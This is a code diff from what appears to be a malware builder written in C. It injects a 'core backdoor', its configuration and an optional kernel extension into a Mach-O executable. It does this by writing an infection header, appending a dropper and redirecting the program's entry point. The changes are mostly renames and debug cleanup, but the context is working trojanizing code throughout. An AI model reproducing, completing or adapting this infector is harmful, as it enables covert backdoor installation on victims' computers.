@@ -166,13 +166,20 @@ int appendData (char *inputFilePointer,
 #ifdef DEBUG
   printf ("Original EP: %x\n", originalEP);
 #endif
+
+  char *coreFileName    = basename(coreFilePath);
+  char *confFileName    = basename(confFilePath);
+  char *kextFileName    = basename(kextFilePath);
+  char *inputFileName   = basename(inputFilePath);
+  char *outputFileName  = basename(outputFilePath);
+
   //
   // Set the infection header
   //
   memset (&infection, 0, sizeof (infectionHeader));
   infection.numberOfResources = numberOfResources;
   infection.numberOfStrings   = gNumStrings;
-  infection.dropperSize       = (int) DROPPER_CODE_SIZE;
+  infection.dropperSize       = (int)DROPPER_CODE_SIZE;
   infection.originalEP        = originalEP; //+ paddedPagezeroVASize - PAGE_ALIGNMENT;
   
   memcpy (outputFilePointer + offset, &infection, sizeof (infectionHeader));
@@ -214,7 +221,7 @@ int appendData (char *inputFilePointer,
   memcpy (outputFilePointer + offset, crtStart, sizeof (crtStart));
   offset += sizeof (crtStart);
   
-  unsigned int ep = (unsigned int) ENTRY_POINT;
+  unsigned int ep = (unsigned int)ENTRY_POINT;
 #ifdef DEBUG_VERBOSE
   printf ("ep: %x\n", ep);
 #endif
@@ -254,11 +261,11 @@ int appendData (char *inputFilePointer,
   offset += sizeof (resourceHeader);
 
 #ifdef WIN32
-  if ((tempFilePointer = mapFile (coreFileName, &tempFileSize,
-								 &tempFD, &tempFDMap, 0)) == NULL)
+  if ((tempFilePointer = mapFile (coreFilePath, &tempFileSize,
+                                  &tempFD, &tempFDMap, 0)) == NULL)
 
 #else
-  if ((tempFilePointer = mapFile (coreFileName, &tempFileSize,
+  if ((tempFilePointer = mapFile (coreFilePath, &tempFileSize,
                                   &tempFD, 0)) == NULL)
 #endif
     {
@@ -300,11 +307,11 @@ int appendData (char *inputFilePointer,
   
   offset += sizeof (resourceHeader);
 #ifdef WIN32
-  if ((tempFilePointer = mapFile (confFileName, &tempFileSize,
-								  &tempFD, &tempFDMap, 0)) == NULL)
+  if ((tempFilePointer = mapFile (confFilePath, &tempFileSize,
+                                  &tempFD, &tempFDMap, 0)) == NULL)
 
 #else 
-  if ((tempFilePointer = mapFile (confFileName, &tempFileSize,
+  if ((tempFilePointer = mapFile (confFilePath, &tempFileSize,
                                   &tempFD, 0)) == NULL)
 #endif
     {
@@ -341,20 +348,22 @@ int appendData (char *inputFilePointer,
       resource.size = gKextFileSize;
       memset (resource.path, 0, sizeof (resource.path));
       memcpy (resource.path, installPath, sizeof (resource.path));
-      
+
+#ifdef DEBUG
       printf ("offset: %x\n", offset);
-      
+#endif
+
       memcpy (outputFilePointer + offset,
               &resource,
               sizeof (resourceHeader));
       
       offset += sizeof (resourceHeader);
 #ifdef WIN32
-	  if ((tempFilePointer = mapFile (kextFileName, &tempFileSize,
-									  &tempFD, &tempFDMap, 0)) == NULL)
+	    if ((tempFilePointer = mapFile (kextFilePath, &tempFileSize,
+			                  						  &tempFD, &tempFDMap, 0)) == NULL)
 
 #else
-      if ((tempFilePointer = mapFile (kextFileName, &tempFileSize,
+      if ((tempFilePointer = mapFile (kextFilePath, &tempFileSize,
                                       &tempFD, 0)) == NULL)
 #endif
         {
@@ -762,12 +771,12 @@ parseArguments (int argc, _mChar **argv)
 	sprintf_s(outputFileName, sizeof(outputFileName), "%s", argv[6]);
 #endif
 
-  coreFileName          = argv[1];
-  confFileName          = argv[2];
-  kextFileName          = argv[3];
+  coreFilePath          = argv[1];
+  confFilePath          = argv[2];
+  kextFilePath          = argv[3];
   installPath           = argv[4];
-  inputFileName         = argv[5];
-  outputFileName        = argv[6];
+  inputFilePath         = argv[5];
+  outputFilePath        = argv[6];
 
   return kSuccess;
 }
@@ -775,30 +784,28 @@ parseArguments (int argc, _mChar **argv)
 #ifdef WIN32
 void freeArguments()
 {
-	if (coreFileName != NULL)
-		free(coreFileName);
-	if (confFileName != NULL)
-		free(confFileName);
-	if (kextFileName != NULL)
-		free(kextFileName);
+	if (coreFilePath != NULL)
+		free(coreFilePath);
+	if (confFilePath != NULL)
+		free(confFilePath);
+	if (kextFilePath != NULL)
+		free(kextFilePath);
 	if (installPath != NULL)
 		free(installPath);
-	if (inputFileName != NULL)
-		free(inputFileName);
-	if (outputFileName != NULL)
-		free(outputFileName);
+	if (inputFilePath != NULL)
+		free(inputFilePath);
+	if (outputFilePath != NULL)
+		free(outputFilePath);
 }	
 #endif
 
 int
 main (int argc, _mChar *argv[])
 {
-  printf("sizeofStat Struct: %d\n", sizeof(struct stat));
-
   struct fat_arch *f_arch;
   char *inputFilePointer      = NULL;
   char *outputFilePointer     = NULL;
-  
+
   int inputFileSize           = 0;
   int outputFileSize          = 0;
   int fileType                = 0;
@@ -829,52 +836,52 @@ main (int argc, _mChar *argv[])
   // Check if the backdoor, configuration file and KEXT exists and get
   // their size
   //
-  if ((gCoreFileSize = getFileSize (coreFileName)) == kErrorGeneric)
+  if ((gCoreFileSize = getFileSize (coreFilePath)) == kErrorGeneric)
     {
       printf ("[ee] Core backdoor file not found\n");
 #ifdef WIN32
-      freeArguments();
+      //freeArguments();
 #endif
       exit (1);
     }
   
-  if ((gConfFileSize = getFileSize (confFileName)) == kErrorGeneric)
+  if ((gConfFileSize = getFileSize (confFilePath)) == kErrorGeneric)
     {
       printf ("[ee] Configuration file not found\n");
 #ifdef WIN32
-      freeArguments();
+      //freeArguments();
 #endif
       exit (1);
     }
   
-  if (strncmp ("null", kextFileName, strlen ("null")) != 0)
+  if (strncmp ("null", kextFilePath, strlen ("null")) != 0)
     {
-      if ((gKextFileSize = getFileSize (kextFileName)) == kErrorGeneric)
+      if ((gKextFileSize = getFileSize (kextFilePath)) == kErrorGeneric)
         {
           printf ("[ee] KEXT file not found\n");
 #ifdef WIN32
-          freeArguments();
+          //freeArguments();
 #endif
           exit (1);
         }
     }
-  
+
   // Map input file
 #ifdef WIN32
-  if ((inputFilePointer = mapFile (inputFileName,
+  if ((inputFilePointer = mapFile (inputFilePath,
                                    &inputFileSize,
                                    &inputFD,
                                    &inputFDMap,
                                    0)) == NULL)
 
 #else
-  if ((inputFilePointer = mapFile (inputFileName, &inputFileSize,
+  if ((inputFilePointer = mapFile (inputFilePath, &inputFileSize,
                                    &inputFD, 0, 0)) == NULL)
 #endif
 	{
       printf("[ee] Error while mmapping the input file\n");
 #ifdef WIN32
-      freeArguments();
+      //freeArguments();
 #endif
       exit (1);
     }
@@ -912,28 +919,28 @@ main (int argc, _mChar *argv[])
   
   // Map output file
 #ifdef WIN32
-  if ((outputFilePointer = mapFile (outputFileName,
+  if ((outputFilePointer = mapFile (outputFilePath,
                                     &tempSize,
                                     &outputFD,
                                     &outputFDMap,
                                     &padding)) == NULL)
 #else
-  if ((outputFilePointer = mapFile (outputFileName, &tempSize,
+  if ((outputFilePointer = mapFile (outputFilePath, &tempSize,
                                     &outputFD, 0, &padding)) == NULL)
 #endif
 	{
     printf("[ee] Error while mmapping the output file\n");
 #ifdef WIN32
-    freeArguments();
+    //freeArguments();
 #endif
     exit (1);
   }
   
-  // Giving the output file the correct fileSize
+  // Giving output file the correct fileSize
 #ifdef WIN32
   if (SetFilePointer(outputFD, tempSize + padding - 1, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
     {
-      freeArguments();
+      //freeArguments();
       exit (1);
     }
 #else
